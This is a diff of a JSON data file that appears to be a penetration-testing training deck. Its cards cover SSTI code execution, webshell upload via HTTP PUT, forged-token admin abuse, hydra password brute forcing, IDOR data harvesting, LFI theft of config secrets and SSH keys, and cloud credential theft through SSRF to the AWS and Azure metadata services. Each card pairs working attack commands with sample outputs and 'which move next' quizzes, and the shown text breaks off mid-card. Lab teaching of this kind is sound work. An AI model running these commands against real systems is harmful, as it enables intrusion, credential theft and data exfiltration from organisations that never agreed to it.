+            "d": "The engine-specific RCE gadget, e.g. Jinja2 \\{\\{cycler.__init__.__globals__.os.popen('id').read()\\}\\} or Freemarker <#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}. uid=... in the response is code execution.",
+            "demo": [
+              {
+                "run": "curl -s -G {{url}} --data-urlencode \"name={{ssti_rce_payload}}\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The engine-specific gadget runs a command."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Swap the command for a reverse shell and catch it with your listener.",
+            "demo": [
+              {
+                "run": "python3 -c \"import urllib.request,urllib.parse; print(urllib.request.urlopen('{{url}}?name='+urllib.parse.quote('{{ssti_shell_payload}}')).read())\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Your listener receives a shell."
+          }
+        ]
+      },
+      "situation": "Scenario: Right after template injection is confirmed, to identify the exact engine. Which move should you run next?",
+      "choices": [
+        "ssti-to-rce",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is SSTI to Code Execution.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is SSTI to Code Execution.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is SSTI to Code Execution."
+      }
+    },
+    "http-put-webshell": {
+      "why": "When the web server allows the PUT method on a writable path, you write a server-side script straight into the web root with no upload form at all, then request it to run commands. In practice, you reach for this step when when the server allows PUT on a writable path (OPTIONS or verb tampering shows it). Success looks like: The script is written into the web root.",
+      "cmd": "curl -s -X PUT {{url}}/shell.php --data-binary @shell.php",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The script is written into the web root.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "When the web server allows the PUT method on a writable path, you write a server-side script straight into the web root with no upload form at all, then request it to run commands.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Write a server-side script into the web root. A 201 or 204 means it took; match the extension to the stack.",
+            "demo": [
+              {
+                "run": "curl -s -X PUT {{url}}/shell.php --data-binary @shell.php",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The script is written into the web root."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Request what you wrote and run a command. uid=... (or the Windows whoami) is your foothold; swap in a reverse shell and catch it with the listener card.",
+            "demo": [
+              {
+                "run": "curl -s \"{{url}}/shell.php?c=id\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The uploaded script runs a command; swap in a reverse shell for a foothold."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "When WebDAV is in play, davtest probes which extensions it will accept and execute, so you upload one that actually runs rather than guessing.",
+            "demo": [
+              {
+                "run": "davtest -url {{url}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "davtest names an extension that actually runs."
+          }
+        ]
+      },
+      "situation": "Scenario: When the server allows PUT on a writable path (OPTIONS or verb tampering shows it). Which move should you run next?",
+      "choices": [
+        "http-put-webshell",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Upload a Webshell via HTTP PUT.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Upload a Webshell via HTTP PUT.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Upload a Webshell via HTTP PUT."
+      }
+    },
+    "authz-abuse": {
+      "why": "With a forged token or a bypassed session in hand, this is where you spend it: reach the admin surface, dump the user and password data, and use an admin-only upload or config writer to land a webshell. In practice, you reach for this step when once you hold a forged token or a bypassed session. Success looks like: The admin area opens with your forged token.",
+      "cmd": "curl -s {{url}}/admin -H \"Authorization: Bearer {{forged_jwt}}\"",
+      "tool": "curl",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The admin area opens with your forged token.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "With a forged token or a bypassed session in hand, this is where you spend it: reach the admin surface, dump the user and password data, and use an admin-only upload or config writer to land a webshell.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Reach the admin surface with the forged token or bypassed session. Map every privileged action it exposes - user management, settings, uploads.",
+            "demo": [
+              {
+                "run": "curl -s {{url}}/admin -H \"Authorization: Bearer {{forged_jwt}}\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The admin area opens with your forged token."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Dump the user/account listing: password hashes and reused credentials here feed crack-identify and the spray/reuse cards.",
+            "demo": [
+              {
+                "run": "curl -s {{url}}/admin/users -H \"Authorization: Bearer {{forged_jwt}}\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The user and credential data dumps."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Upload a webshell through the admin-only feature and request it.",
+            "demo": [
+              {
+                "run": "curl -s -X POST {{url}}/admin/upload -H \"Authorization: Bearer {{forged_jwt}}\" -F \"file=@shell.php\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The admin upload runs code."
+          }
+        ]
+      },
+      "situation": "Scenario: Once you hold a forged token or a bypassed session. Which move should you run next?",
+      "choices": [
+        "authz-abuse",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Abuse the Authorization Bypass.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Abuse the Authorization Bypass.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Abuse the Authorization Bypass."
+      }
+    },
+    "web-login-brute": {
+      "why": "You enumerated real usernames; now you guess their passwords against the login form. And always try the same users against SSH, because web and shell passwords are reused constantly and an SSH hit is a direct foothold. In practice, you reach for this step when once you have an enumerated user list. Success looks like: hydra prints a valid login and password.",
+      "cmd": "hydra -L {{userlist}} -P {{wordlist}} {{target}} http-post-form \"{{form_path}}:{{form_body}}:{{fail_string}}\"",
+      "tool": "hydra",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "hydra prints a valid login and password.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "You enumerated real usernames; now you guess their passwords against the login form.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "The workhorse. {{form_body}} carries ^USER^/^PASS^ markers and {{fail_string}} is text that appears ONLY on a failed login. A [80][http-post-form] ... login: ... password: ... line is a hit.",
+            "demo": [
+              {
+                "run": "hydra -L {{userlist}} -P {{wordlist}} {{target}} http-post-form \"{{form_path}}:{{form_body}}:{{fail_string}}\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "hydra prints a valid login and password."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "For WordPress: wpscan already enumerated the users (web.users); feed them straight back for the password attack against wp-login.",
+            "demo": [
+              {
+                "run": "wpscan --url {{url}} -U {{userlist}} -P {{wordlist}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "wpscan finds a working wp-login credential."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Always try the enumerated app users against SSH too - web and shell passwords are reused constantly, and an SSH hit is a direct foothold.",
+            "demo": [
+              {
+                "run": "hydra -L {{userlist}} -P {{wordlist}} ssh://{{target}}",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "hydra finds an SSH login among the app users."
+          }
+        ]
+      },
+      "situation": "Scenario: Once you have an enumerated user list. Which move should you run next?",
+      "choices": [
+        "web-login-brute",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Brute the Login with the Enumerated Users.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Brute the Login with the Enumerated Users.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Brute the Login with the Enumerated Users."
+      }
+    },
+    "idor-harvest": {
+      "why": "Once an IDOR is confirmed, this walks the whole object range with your own session and pulls every record: the passwords, tokens, and files that export and profile endpoints hand over in full. In practice, you reach for this step when once an IDOR is confirmed, to pull every record. Success looks like: The whole object range returns records.",
+      "cmd": "ffuf -u {{url}}/account?id=FUZZ -w <(seq 1000 1100) -H \"Cookie: {{session}}\" -mc 200",
+      "tool": "ffuf",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "The whole object range returns records.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Once an IDOR is confirmed, this walks the whole object range with your own session and pulls every record: the passwords, tokens, and files that export and profile endpoints hand over in full.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Walk the object range with your own session. Every 200 is another user's record; -fs/-fw out the \"not yours\" response size so only real hits show.",
+            "demo": [
+              {
+                "run": "ffuf -u {{url}}/account?id=FUZZ -w <(seq 1000 1100) -H \"Cookie: {{session}}\" -mc 200",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "The whole object range returns records."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Pull each record and grep the responses for password, token, api_key, secret - export/invoice/profile endpoints hand these over in full, feeding crack-identify and the spray list.",
+            "demo": [
+              {
+                "run": "for i in $(seq 1000 1100); do curl -s -b \"{{session}}\" {{url}}/api/export?id=$i; done",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Credentials fall out of the export or profile endpoint."
+          }
+        ]
+      },
+      "situation": "Scenario: Once an IDOR is confirmed, to pull every record. Which move should you run next?",
+      "choices": [
+        "idor-harvest",
+        "vhost-discovery",
+        "content-discovery",
+        "web-access-blocked"
+      ],
+      "coach": {
+        "vhost-discovery": "Virtual Host Discovery targets confirms a virtual host you have located; here the direct move is Harvest Data Through the IDOR.",
+        "content-discovery": "Content Discovery targets produces a catalogue of the web content you have uncovered; here the direct move is Harvest Data Through the IDOR.",
+        "web-access-blocked": "Web Request Blocked - WAF, Rate Limit, or Wrong Scheme targets nothing attack-wise; it gets your requests flowing again; here the direct move is Harvest Data Through the IDOR."
+      }
+    },
+    "lfi-secret-harvest": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: The user are enumerated.",
+      "cmd": "curl 'http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=config'",
+      "tool": "curl",
+      "output": "PD9waHAKJGRiX3VzZXIgPSAnd2ViYXBwJzsKJGRiX3Bhc3MgPSAnUzNjcjN0UGFzcyEnOwo=",
+      "signal": "PD9waHA",
+      "teach": "The base64 wrapper returned the config source without executing it. Decode it (base64 -d) and the database username and password are in cleartext inside, a candidate you can reuse against other services or feed to the cracker.",
+      "leadup": [
+        {
+          "key": "lfi",
+          "label": "The LFI is confirmed",
+          "steps": [
+            {
+              "title": "Read a known file",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl 'http://<target>/index.php?page=../../../../etc/passwd'",
+              "out": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
+              "sig": "root:x:0:0:root",
+              "teach": "A clean /etc/passwd read proves the include reaches the filesystem; now aim it at files that hold secrets."
+            }
+          ]
+        },
+        {
+          "key": "wrapper",
+          "label": "PHP source came back blank",
+          "steps": [
+            {
+              "title": "The include executed the source",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl 'http://<target>/index.php?page=config.php'",
+              "out": "<html><body>Welcome back</body></html>",
+              "sig": "<html><body>Welcome back</body></html>",
+              "teach": "A rendered page with no PHP in it means the server executed the file instead of printing it; the php://filter wrapper pulls the raw source instead."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Harvesting is a tour of the files a web user can read: system accounts, app config, keys, then into the credential loop.",
+        "items": [
+          {
+            "t": "Read the obvious files",
+            "d": "Start with /etc/passwd for user names and shells, then /etc/hosts and any app path you can guess. These confirm the read and name your targets.",
+            "demo": [
+              {
+                "run": "curl 'http://<target>/index.php?page=../../../../etc/passwd'",
+                "out": "root:x:0:0:root:/root:/bin/bash",
+                "sig": "root:x:0:0:root"
+              }
+            ],
+            "note": "The users with real shells are the accounts worth a password or a key."
+          },
+          {
+            "t": "Pull PHP source with the filter wrapper",
+            "d": "When the include runs the source instead of printing it, php://filter base64-encodes the file so you get the raw bytes, config secrets and all.",
+            "demo": [
+              {
+                "run": "curl 'http://<target>/index.php?page=php://filter/convert.base64-encode/resource=config'",
+                "out": "PD9waHAKJGRiX3Bhc3MgPSAnUzNjcjN0UGFzcyEnOwo=",
+                "sig": "PD9waHA"
+              }
+            ],
+            "note": "Decode with base64 -d; database and API credentials live in these config files."
+          },
+          {
+            "t": "Grab SSH keys",
+            "d": "A readable private key under a home directory is a direct login. Try the users you found in /etc/passwd.",
+            "demo": [
+              {
+                "run": "curl 'http://<target>/index.php?page=../../../../home/j.smith/.ssh/id_rsa'",
+                "out": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAA",
+                "sig": "BEGIN OPENSSH PRIVATE KEY"
+              }
+            ],
+            "note": "Save it, chmod 600, and ssh in as that user; a passphrase can be cracked with ssh2john."
+          },
+          {
+            "t": "Feed the loot into the loop",
+            "d": "Decode configs, identify any hash, then crack or reuse. A recovered password often unlocks SSH, the database, or an admin panel elsewhere on the box.",
+            "note": "This is why LFI matters: it does not run code, but it hands you the credentials that do."
+          }
+        ]
+      },
+      "situation": "You confirmed an LFI on a PHP app that reads files as www-data. What turns the read into access?",
+      "choices": [
+        "lfi-secret-harvest",
+        "lfi-probe",
+        "file-upload",
+        "command-injection"
+      ],
+      "coach": {
+        "lfi-probe": "That is how you confirmed the LFI; now harvest the configs, keys, and hashes it can read.",
+        "file-upload": "No upload form is in play; your primitive is the include reading files, not writing them.",
+        "command-injection": "The include reads files, it does not run commands yet; harvest secrets, or try log poisoning as a separate step."
+      }
+    },
+    "aws-credential-abuse": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: The are loaded into your environment.",
+      "cmd": "aws sts get-caller-identity",
+      "tool": "aws",
+      "output": "{\n    \"UserId\": \"AROAEXAMPLE:i-0abc123\",\n    \"Account\": \"123456789012\",\n    \"Arn\": \"arn:aws:sts::123456789012:assumed-role/web-role/i-0abc123\"\n}",
+      "signal": "assumed-role/web-role",
+      "teach": "The keys are valid and belong to web-role on the instance. Enumerate what that role can do (iam, s3, secretsmanager), then loot buckets and secrets or chain a role-assumption for more access.",
+      "leadup": [
+        {
+          "key": "ssrf",
+          "label": "SSRF reached the metadata service",
+          "steps": [
+            {
+              "title": "Read the role credentials",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s 'http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role'",
+              "out": "{\"AccessKeyId\":\"ASIAEXAMPLE123456789\",\"SecretAccessKey\":\"wJalr...\",\"Token\":\"IQoJb...\"}",
+              "sig": "ASIAEXAMPLE123456789",
+              "teach": "The SSRF returned temporary credentials; obol reads them as a cloud credential to try with the CLI."
+            }
+          ]
+        },
+        {
+          "key": "configure",
+          "label": "You loaded the keys",
+          "steps": [
+            {
+              "title": "Set the environment",
+              "tool": "aws",
+              "where": "local",
+              "cmd": "export AWS_ACCESS_KEY_ID=ASIAEXAMPLE123456789 AWS_SECRET_ACCESS_KEY=wJalr... AWS_SESSION_TOKEN=IQoJb...",
+              "out": "",
+              "out_note": "no output",
+              "sig": "",
+              "teach": "Temporary (ASIA) keys require the session token; without it every call fails with an auth error."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Cloud key abuse is confirm the identity, map the permissions, then loot and look for escalation.",
+        "items": [
+          {
+            "t": "Confirm the keys work",
+            "d": "sts get-caller-identity is the free, read-only call that proves the keys are valid and tells you which role you are.",
+            "demo": [
+              {
+                "run": "aws sts get-caller-identity",
+                "out": "\"Arn\": \"arn:aws:sts::123456789012:assumed-role/web-role/i-0abc123\"",
+                "sig": "assumed-role/web-role"
+              }
+            ],
+            "note": "An error here means the token is missing or the keys expired; re-pull from the metadata service."
+          },
+          {
+            "t": "Map what the role can do",
+            "d": "Try the common services. You rarely have iam:ListRolePolicies, so probe by action: list buckets, list secrets, describe instances.",
+            "demo": [
+              {
+                "run": "aws s3 ls; aws secretsmanager list-secrets --query 'SecretList[].Name'",
+                "out": "2023-01-01 app-backups\n[\n    \"prod/db/password\"\n]",
+                "sig": "prod/db/password"
+              }
+            ],
+            "note": "A named secret like prod/db/password is often the whole game."
+          },
+          {
+            "t": "Loot buckets and secrets",
+            "d": "Pull the readable buckets and the secret values. Database passwords and API keys here frequently reuse onto the hosts you are attacking.",
+            "demo": [
+              {
+                "run": "aws secretsmanager get-secret-value --secret-id prod/db/password --query SecretString",
+                "out": "\"{\\\"user\\\":\\\"admin\\\",\\\"pass\\\":\\\"S3cr3tDbPass\\\"}\"",
+                "sig": "S3cr3tDbPass"
+              }
+            ],
+            "note": "Feed recovered credentials straight back into the credential loop."
+          },
+          {
+            "t": "Look for an escalation path",
+            "d": "iam:PassRole with a compute service, a writable Lambda, or ssm:SendCommand onto the instance can turn a limited role into code execution or a higher role.",
+            "demo": [
+              {
+                "run": "aws ssm send-command --document-name AWS-RunShellScript --targets Key=instanceids,Values=i-0abc123 --parameters 'commands=id'",
+                "out": "\"CommandId\": \"a1b2c3d4\"",
+                "sig": "CommandId"
+              }
+            ],
+            "note": "SendCommand onto the instance runs as root/SYSTEM via the SSM agent; that is your shell on the box."
+          }
+        ]
+      },
+      "situation": "An SSRF pulled temporary AWS keys (ASIA...) from the instance metadata service. What turns them into access?",
+      "choices": [
+        "aws-credential-abuse",
+        "ssrf",
+        "content-discovery",
+        "crack-identify"
+      ],
+      "coach": {
+        "ssrf": "The SSRF is how you got the keys; now use them with the aws CLI to enumerate and loot the account.",
+        "content-discovery": "You are past the web app now; the next surface is the cloud account the keys belong to.",
+        "crack-identify": "These are live temporary keys, not a hash to crack; load them into the CLI and use them."
+      }
+    },
+    "graphql-abuse": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: returns the schema.",
+      "cmd": "curl -s http://10.10.10.10/graphql -d '{\"query\":\"{__schema{types{name}}}\"}' -H 'Content-Type: application/json'",
+      "tool": "curl",
+      "output": "{\"data\":{\"__schema\":{\"types\":[{\"name\":\"User\"},{\"name\":\"Query\"},{\"name\":\"Mutation\"}]}}}",
+      "signal": "__schema",
+      "teach": "Introspection is enabled and returns the schema, including a Mutation type. Enumerate its fields, then test the sensitive queries and mutations for missing per-resolver authorization.",
+      "leadup": [
+        {
+          "key": "endpoint",
+          "label": "You found /graphql",
+          "steps": [
+            {
+              "title": "Confirm the endpoint",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s http://<target>/graphql -d '{\"query\":\"{__typename}\"}' -H 'Content-Type: application/json'",
+              "out": "{\"data\":{\"__typename\":\"Query\"}}",
+              "sig": "__typename",
+              "teach": "A __typename response confirms a live GraphQL endpoint worth attacking."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "GraphQL abuse is introspect the schema, map the sensitive operations, then test each for missing authorization.",
+        "items": [
+          {
+            "t": "Pull the schema with introspection",
+            "d": "A full introspection query returns every type, query, and mutation. GraphQL tooling (or a saved query) renders it readable.",
+            "demo": [
+              {
+                "run": "curl -s http://<target>/graphql -d '{\"query\":\"{__schema{queryType{name} mutationType{name} types{name fields{name}}}}\"}' -H 'Content-Type: application/json'",
+                "out": "\"mutationType\":{\"name\":\"Mutation\"}",
+                "sig": "\"mutationType\""
+              }
+            ],
+            "note": "If introspection is off, guess common field names or diff the client-side JS."
+          },
+          {
+            "t": "Find sensitive queries and mutations",
+            "d": "Look for users, secrets, admin, update, delete, and anything that changes state; these are where broken authorization bites.",
+            "demo": [
+              {
+                "run": "curl -s http://<target>/graphql -d '{\"query\":\"{users{id email role}}\"}' -H 'Content-Type: application/json'",
+                "out": "{\"data\":{\"users\":[{\"id\":1,\"email\":\"admin@acme.internal\",\"role\":\"admin\"}]}}",
+                "sig": "admin@acme.internal"
+              }
+            ],
+            "note": "Returning another user's data unauthenticated is a direct finding."
+          },
+          {
+            "t": "Test authorization per resolver",
+            "d": "Call privileged queries and mutations as a low-privilege (or anonymous) user. Per-resolver checks are often missing even when the login works.",
+            "demo": [
+              {
+                "run": "curl -s http://<target>/graphql -d '{\"query\":\"mutation{updateUser(id:1,role:\\\"admin\\\"){id role}}\"}' -H 'Content-Type: application/json'",
+                "out": "{\"data\":{\"updateUser\":{\"id\":1,\"role\":\"admin\"}}}",
+                "sig": "\"role\":\"admin\""
+              }
+            ],
+            "note": "A mutation you should not be allowed to run is the escalation."
+          },
+          {
+            "t": "Abuse batching and injection",
+            "d": "Batched queries can bypass rate limits for brute force, and resolver arguments can carry SQL or NoSQL injection like any other input.",
+            "note": "Treat each argument as an injectable sink and each mutation as an authorization test."
+          }
+        ]
+      },
+      "situation": "Content discovery found /graphql and introspection returns the full schema including a Mutation type. What is the move?",
+      "choices": [
+        "graphql-abuse",
+        "content-discovery",
+        "sqli-basics",
+        "idor"
+      ],
+      "coach": {
+        "content-discovery": "You already found the endpoint; now attack the schema it exposes.",
+        "sqli-basics": "Injection is one test, but GraphQL's bigger weakness is usually per-resolver authorization; map the mutations first.",
+        "idor": "IDOR is part of it; GraphQL introspection lets you find every object and operation to test at once."
+      }
+    },
+    "azure-imds": {
+      "why": "During an assessment, operators reach for this step to convert an initial lead into hard evidence without blind guessing. Rather than burning time on trial-and-error payloads, you run a focused check, inspect the terminal response for the confirmation marker, and feed the minted fact straight into the next phase of the attack chain. Key indicator: The responds through the",
+      "cmd": "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
+      "tool": "curl",
+      "output": "{\"access_token\":\"eyJ0eXAiOiJKV1Qi...\",\"resource\":\"https://management.azure.com/\",\"token_type\":\"Bearer\"}",
+      "signal": "\"access_token\"",
+      "teach": "The managed-identity token for the management API came back. Use it with the az CLI (or raw REST) to enumerate the subscription, read Key Vault secrets, and look for a runCommand to a VM.",
+      "leadup": [
+        {
+          "key": "ssrf",
+          "label": "SSRF reaches the metadata service",
+          "steps": [
+            {
+              "title": "Confirm you are on Azure",
+              "tool": "curl",
+              "where": "local",
+              "cmd": "curl -s -H 'Metadata:true' 'http://<target>/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01'",
+              "out": "{\"compute\":{\"name\":\"web-vm\",\"resourceGroupName\":\"rg-prod\"}}",
+              "sig": "resourceGroupName",
+              "teach": "Instance metadata confirms an Azure VM and names the resource group, so a managed-identity token is likely reachable."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Azure IMDS abuse is pull a resource-scoped token through the SSRF, then use it to enumerate and loot the subscription.",
+        "items": [
+          {
+            "t": "Request a management token",
+            "d": "Ask the metadata service for a token scoped to the ARM management API, passing Metadata:true. The SSRF must smuggle that header.",
+            "demo": [
+              {
+                "run": "curl -s -H 'Metadata:true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'",
+                "out": "{\"access_token\":\"eyJ0eXAiOiJKV1Qi...\"}",
+                "sig": "\"access_token\""
+              }
+            ],
+            "note": "A separate token is needed per resource (Key Vault uses resource=https://vault.azure.net)."
+          },
+          {
+            "t": "Enumerate with the token",
+            "d": "Load the token into the az CLI (or call REST directly) and list what the identity can see: subscriptions, resource groups, VMs, Key Vaults.",
+            "demo": [
+              {
+                "run": "az rest --url 'https://management.azure.com/subscriptions?api-version=2020-01-01' --headers \"Authorization=Bearer {{token}}\"",
+                "out": "\"displayName\": \"Production\"",
+                "sig": "displayName"
+              }
+            ],
+            "note": "The role assignment on the identity decides how far you get."
+          },
+          {
+            "t": "Loot Key Vault secrets",
+            "d": "A Key Vault token reads stored secrets, which routinely include database and admin credentials that reuse onto the hosts you are attacking.",
+            "demo": [
+              {
+                "run": "az keyvault secret show --id 'https://kv-prod.vault.azure.net/secrets/db-password'",
+                "out": "\"value\": \"Pr0dDbP@ss\"",
